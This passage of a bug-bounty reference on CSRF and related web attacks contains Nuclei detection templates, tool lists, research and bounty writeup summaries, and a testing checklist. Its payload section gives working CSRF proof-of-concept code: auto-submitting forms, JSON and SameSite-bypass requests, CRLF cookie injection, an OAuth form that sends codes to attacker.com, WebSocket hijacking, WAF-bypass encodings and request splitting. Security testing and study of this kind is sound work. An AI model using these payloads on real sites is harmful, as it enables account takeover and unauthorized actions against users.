  - method: GET
    path:
      - "{{BaseURL}}/authorize?client_id=test&redirect_uri=https://example.com"
    matchers:
      - type: word
        words:
          - "state="
        negative: true
        part: url
```

### Method Override Detection
```yaml
id: method-override-support

info:
  name: HTTP Method Override Support
  author: custom
  severity: info
  description: Detects if server supports method override

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        X-HTTP-Method-Override: POST
    matchers:
      - type: status
        status:
          - 200
          - 405
```

### CRLF Injection (Cookie Injection Vector)
```yaml
id: crlf-cookie-injection

info:
  name: CRLF Cookie Injection
  author: custom
  severity: high
  description: Detects CRLF injection in Set-Cookie header

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?search=test%0d%0aSet-Cookie:%20csrf=test"
    matchers:
      - type: regex
        part: header
        regex:
          - "Set-Cookie: csrf=test"
```

### Login CSRF Detection
```yaml
id: login-csrf-missing

info:
  name: Login Form Missing CSRF Protection
  author: custom
  severity: medium
  description: Login endpoints should have CSRF protection

requests:
  - method: GET
    path:
      - "{{BaseURL}}/login"
      - "{{BaseURL}}/signin"
      - "{{BaseURL}}/auth"
    matchers:
      - type: regex
        part: body
        regex:
          - "<form.*action=.*(login|signin|auth)"
      - type: regex
        part: body
        regex:
          - "(csrf|token|nonce)"
        negative: true
```

---

## Tools and Scanners

### Specialized CSRF Tools
| Tool | Purpose | Link |
|------|---------|------|
| **XSRFProbe** | Comprehensive CSRF audit toolkit | https://github.com/0xInfection/XSRFProbe |
| **CSRFTester** | Manual CSRF PoC generation | OWASP Project |
| **Burp CSRF Token Tracker** | Automatic token replacement | Burp BApp Store |

### Request Smuggling / Desync
| Tool | Purpose | Link |
|------|---------|------|
| **HTTP Request Smuggler** | Automated desync detection | https://github.com/PortSwigger/http-request-smuggler |
| **Turbo Intruder** | High-speed HTTP testing | https://github.com/PortSwigger/turbo-intruder |
| **Smuggler** | Alternative desync scanner | https://github.com/defparam/smuggler |

### Cache Poisoning
| Tool | Purpose | Link |
|------|---------|------|
| **Param Miner** | Unkeyed parameter/header discovery | https://github.com/PortSwigger/param-miner |
| **Web Cache Deception Scanner** | Cache behavior analysis | Custom scripts |

### Recon / Automation
| Tool | Purpose | Link |
|------|---------|------|
| **Nuclei** | Vulnerability scanner | https://github.com/projectdiscovery/nuclei |
| **httpx** | Fast HTTP prober | https://github.com/projectdiscovery/httpx |
| **katana** | Web crawler | https://github.com/projectdiscovery/katana |
| **subfinder** | Subdomain discovery | https://github.com/projectdiscovery/subfinder |
| **interactsh** | OOB interaction | https://github.com/projectdiscovery/interactsh |
| **notify** | Notification framework | https://github.com/projectdiscovery/notify |

### PostMessage / Client-Side
| Tool | Purpose | Link |
|------|---------|------|
| **postMessage-tracker** | postMessage monitoring | https://github.com/fransr/postMessage-tracker |
| **pp-finder** | Prototype pollution scanner | https://github.com/yeswehack/pp-finder |
| **DOM Invader** | DOM vulnerability detection | Burp Suite extension |

### Payload Collections
| Resource | Content | Link |
|----------|---------|------|
| **PayloadsAllTheThings CSRF** | CSRF payloads | https://github.com/swisskyrepo/PayloadsAllTheThings |
| **SecLists Fuzzing** | Wordlists | https://github.com/danielmiessler/SecLists |
| **CSRF Payload List** | Dedicated CSRF payloads | https://github.com/payloadbox/csrf-payload-list |
| **BugBounty CSRF** | BB-specific techniques | https://github.com/0xspade/bugbounty |

---

## Advanced Research

### Browser-Powered Desync (2022)
**Researcher**: James Kettle (PortSwigger)
**Key findings**:
- CL.0 desync: Backend ignores Content-Length on POST to static files
- H2.0 desync: HTTP/2 without CL triggers ALB to add TE: chunked
- Client-side desync: Browser connection pool poisoning
- Pause-based desync: Timeout differences between front-end and back-end

**Impact**: Single-server websites previously thought immune to request smuggling are now vulnerable.

### Web Cache Entanglement (2020)
**Researcher**: James Kettle (PortSwigger)
**Key findings**:
- Cache key normalization differences enable poisoning
- Parameter cloaking via parsing discrepancies
- Fat GET poisoning via body exclusion from cache key
- Cache key injection via delimiter injection
- Internal cache poisoning affects fragments/templates

### Hidden OAuth Attack Vectors (2021)
**Researchers**: Artem Lodygin, Alexey Tyurin
**Key findings**:
- Dynamic client registration = SSRF by design
- `redirect_uri` session poisoning via race conditions
- Mass assignment on OAuth confirmation pages
- WebFinger user enumeration

### Bypassing SameSite Restrictions (Research)
**Key techniques**:
- The 2-minute Lax-by-default window
- Method override for GET→POST conversion
- On-site gadgets for Strict bypass
- Sibling domain XSS chains
- Cross-site WebSocket hijacking

---

## Bug Bounty Writeups

### PayPal CSRF → Account Takeover
- **Researcher**: Yasser Ali
- **Technique**: Bypassed CSRF protection on password reset
- **Impact**: Full account takeover with single click
- **Key lesson**: Legacy endpoints may have weaker CSRF protection

### Facebook Oculus Integration CSRF
- **Researcher**: Josip Franjkovic
- **Technique**: CSRF in Oculus-Facebook account linking
- **Impact**: Account takeover via forced linking

### Twitter Add-to-Collection CSRF
- **Researcher**: Vijay Kumar (indoappsec)
- **Technique**: Missing CSRF token on collection API
- **Impact**: Unauthorized tweet collection manipulation

### GitHub Fat GET Cache Poisoning
- **Researcher**: James Kettle
- **Technique**: Varnish fat GET + Rails parameter parsing
- **Bounty**: $10,000
- **Lesson**: Cache behavior can turn "unexploitable" bugs into critical vulnerabilities

### Mozilla Firefox Update DoS
- **Researcher**: James Kettle
- **Technique**: Nginx cache key normalization + URL encoding
- **Impact**: Global Firefox update disruption
- **Lesson**: Cache poisoning can affect infrastructure, not just individual apps

---

## Payload Collections

### HTML Form-Based CSRF

#### GET - User Interaction Required
```html
<a href="https://target.com/api/setusername?username=CSRFd">Click Me</a>
```

#### GET - No Interaction
```html
<img src="https://target.com/api/setusername?username=CSRFd">
```

#### POST - User Interaction
```html
<form action="https://target.com/api/setusername" enctype="text/plain" method="POST">
    <input name="username" type="hidden" value="CSRFd" />
    <input type="submit" value="Submit Request" />
</form>
```

#### POST - AutoSubmit
```html
<form id="autosubmit" action="https://target.com/api/setusername" enctype="text/plain" method="POST">
    <input name="username" type="hidden" value="CSRFd" />
</form>
<script>document.getElementById("autosubmit").submit();</script>
```

#### POST - multipart/form-data with File Upload
```html
<script>
function launch(){
    const dT = new DataTransfer();
    const file = new File(["CSRF-filecontent"], "CSRF-filename");
    dT.items.add(file);
    document.xss[0].files = dT.files;
    document.xss.submit()
}
</script>
<form style="display: none" name="xss" method="post" action="https://target.com/upload" enctype="multipart/form-data">
    <input id="file" type="file" name="file"/>
    <input type="submit" name="" value="" size="0" />
</form>
<button value="button" onclick="launch()">Submit Request</button>
```

### JSON CSRF Payloads

#### JSON POST - Simple Request (text/plain)
```html
<form id="CSRF_POC" action="https://target.com/api/setrole" enctype="text/plain" method="POST">
    <input type="hidden" name='{"role":admin, "ignore":"' value='"}' />
</form>
<script>document.getElementById("CSRF_POC").submit();</script>
```

#### JSON POST - XHR with Custom Header
```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":"admin"}');
```

#### JSON POST - Fetch API
```javascript
fetch("https://target.com/api/setrole", {
    method: "POST",
    headers: {
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest"
    },
    credentials: "include",
    body: JSON.stringify({role: "admin"})
});
```

### SameSite Bypass Payloads

#### Lax Bypass via GET
```html
<script>
    document.location = 'https://target.com/account/transfer?recipient=hacker&amount=1000000';
</script>
```

#### Lax Bypass via Method Override
```html
<form action="https://target.com/account/transfer" method="GET">
    <input type="hidden" name="_method" value="POST">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
<script>document.forms[0].submit();</script>
```

#### Strict Bypass via Client-Side Redirect Gadget
```html
<!-- Step 1: Navigate to redirect gadget (same-site) -->
<script>
    window.location = 'https://target.com/redirect?url=https://target.com/api/delete';
</script>
```

#### Strict Bypass via Sibling Domain XSS
```javascript
// From XSS on sibling.target.com
fetch('https://target.com/api/action', {
    method: 'POST',
    credentials: 'include',
    body: 'action=delete'
});
```

### Cookie Injection Payloads

#### CRLF → Cookie Injection
```html
<img src="https://target.com/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" 
     onerror="document.forms[0].submit();"/>
<form action="https://target.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf" value="fake">
</form>
```

#### Cookie Tossing
```javascript
// From attacker.target.com
document.cookie = "csrf=attacker_controlled; Domain=.target.com; Path=/; SameSite=None";
```

### OAuth CSRF Payloads

#### Authorization Code Interception
```html
<!-- Force victim to authorize attacker's client -->
<form action="https://oauth-server.com/authorize" method="GET">
    <input type="hidden" name="client_id" value="attacker_client">
    <input type="hidden" name="redirect_uri" value="https://attacker.com/callback">
    <input type="hidden" name="response_type" value="code">
    <input type="hidden" name="scope" value="profile">
</form>
<script>document.forms[0].submit();</script>
```

#### State Parameter Bypass
```html
<!-- Use attacker's known state value -->
<script>
// Step 1: Attacker gets state from their own OAuth flow
// Step 2: Trick victim into completing flow with attacker's state
// Step 3: Exchange code using attacker's state
</script>
```

### WebSocket CSRF
```javascript
// Cross-site WebSocket hijacking
var ws = new WebSocket('wss://target.com/chat');
ws.onopen = function() {
    ws.send("JOIN #general");
    ws.send("SEND attacker: stolen data");
};
```

---

## WAF Bypasses

### Header Case Variation
```
Content-type: application/json
content-type: application/json
CONTENT-TYPE: application/json
```

### Charset Obfuscation
```
Content-Type: application/x-www-form-urlencoded; charset=utf-7
Content-Type: application/x-www-form-urlencoded; charset=ibm866
```

### Parameter Encoding
```
# URL-encoded parameter names
%63srf=token (csrf)
%5f%6d%65%74%68%6f%64=POST (_method)

# Double URL encoding
%2563srf=token
```

### JSON Bypass for WAF
```
# Using JSON comments (non-standard)
{"role"/*comment*/:"admin"}

# Unicode escape sequences
{"role":"\u0061dmin"}
```

### Request Splitting
```
GET / HTTP/1.1
Host: target.com
X-Ignore: foo
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```

---

## Detection Techniques

### Manual Testing Checklist
- [ ] Identify all state-changing endpoints
- [ ] Check for CSRF tokens in forms and AJAX requests
- [ ] Test token predictability and session binding
- [ ] Analyze cookie SameSite attributes
- [ ] Test method override support
- [ ] Check Referer/Origin validation
- [ ] Test for CRLF injection in cookie-setting endpoints
- [ ] Identify OAuth/OpenID endpoints
- [ ] Check for WebSocket handshake CSRF
- [ ] Test for client-side redirect gadgets
- [ ] Audit sibling domains for XSS
- [ ] Check cache behavior for poisoning potential
- [ ] Test for prototype pollution gadgets
- [ ] Monitor postMessage handlers

### Automated Detection Signals
```
1. Form without csrf/token/nonce parameter
2. Cookie without SameSite attribute
3. OAuth authorize without state parameter
4. Endpoint accepting _method parameter
5. Set-Cookie header reflecting user input
6. WebSocket handshake without Origin check
7. postMessage without origin validation
8. Cache status headers with suspicious behavior
```

### Confirming CSRF Vulnerability
```
Step 1: Capture legitimate request
Step 2: Remove CSRF token (if present)
Step 3: Change Origin/Referer to attacker.com
Step 4: Submit from different origin context
Step 5: Verify action was executed
Step 6: Check if response indicates success
```

---

## References

### PortSwigger Resources
- Web Security Academy - CSRF: https://portswigger.net/web-security/csrf
- Bypassing SameSite Restrictions: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
- Browser-Powered Desync Attacks: https://portswigger.net/research/browser-powered-desync-attacks
- Hidden OAuth Attack Vectors: https://portswigger.net/research/hidden-oauth-attack-vectors
- Web Cache Entanglement: https://portswigger.net/research/web-cache-entanglement
- Practical Web Cache Poisoning: https://portswigger.net/research/practical-web-cache-poisoning
- HTTP/1 Must Die: https://portswigger.net/research/http1-must-die

### GitHub Resources
- PayloadsAllTheThings CSRF: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Cross-Site%20Request%20Forgery
- CSRF Payload List: https://github.com/payloadbox/csrf-payload-list
- BugBounty CSRF: https://github.com/0xspade/bugbounty/tree/master/csrf
- HTTP Request Smuggler: https://github.com/PortSwigger/http-request-smuggler
- Param Miner: https://github.com/PortSwigger/param-miner
- postMessage-tracker: https://github.com/fransr/postMessage-tracker
- pp-finder: https://github.com/yeswehack/pp-finder
- CursedChrome: https://github.com/mandatoryprogrammer/CursedChrome
- Client-Side Prototype Pollution: https://github.com/BlackFan/client-side-prototype-pollution

### ProjectDiscovery Tools
- Nuclei: https://github.com/projectdiscovery/nuclei
- httpx: https://github.com/projectdiscovery/httpx
- katana: https://github.com/projectdiscovery/katana
- subfinder: https://github.com/projectdiscovery/subfinder
- interactsh: https://github.com/projectdiscovery/interactsh
- notify: https://github.com/projectdiscovery/notify

### MDN Documentation
- Cookies: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
- Origin Header: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin
- Referer Header: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer
- CSRF Prevention: https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/CSRF_prevention
- Fetch API: https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API
- XMLHttpRequest: https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest

### Additional Resources
- HackTricks CSRF: https://book.hacktricks.wiki/en/pentesting-web/csrf-cross-site-request-forgery.html
- SecLists Fuzzing: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing
- SecLists Web Content: https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
- OWASP CSRF Prevention Cheat Sheet
- RFC 6265bis (Cookies)
- RFC 6749 (OAuth 2.0)
- RFC 7591 (OAuth Dynamic Client Registration)

### Research Papers & Talks
- James Kettle - "Browser-Powered Desync Attacks" (Black Hat USA 2022, DEF CON 30)
- James Kettle - "Web Cache Entanglement" (Black Hat USA 2020)
- Artem Lodygin & Alexey Tyurin - "Hidden OAuth Attack Vectors" (2021)
- Michał Zalewski - "The Tangled Web" (Browser security fundamentals)

### Bug Bounty Writeups
- Yasser Ali - PayPal Account Takeover
- Josip Franjkovic - Facebook Oculus CSRF
- Vijay Kumar - Twitter Collection CSRF
- Florian Courtial - PayPal.me CSRF
- Aaditya Purani - Apple Beats Account Takeover
- Jack Whitton - Messenger.com CSRF

---

> **Document Version**: 1.0
> **Last Updated**: 2026-05-24
> **Classification**: Research-Grade Bug Bounty Reference
> **Author**: Compiled from multiple security research sources for Codex skill development
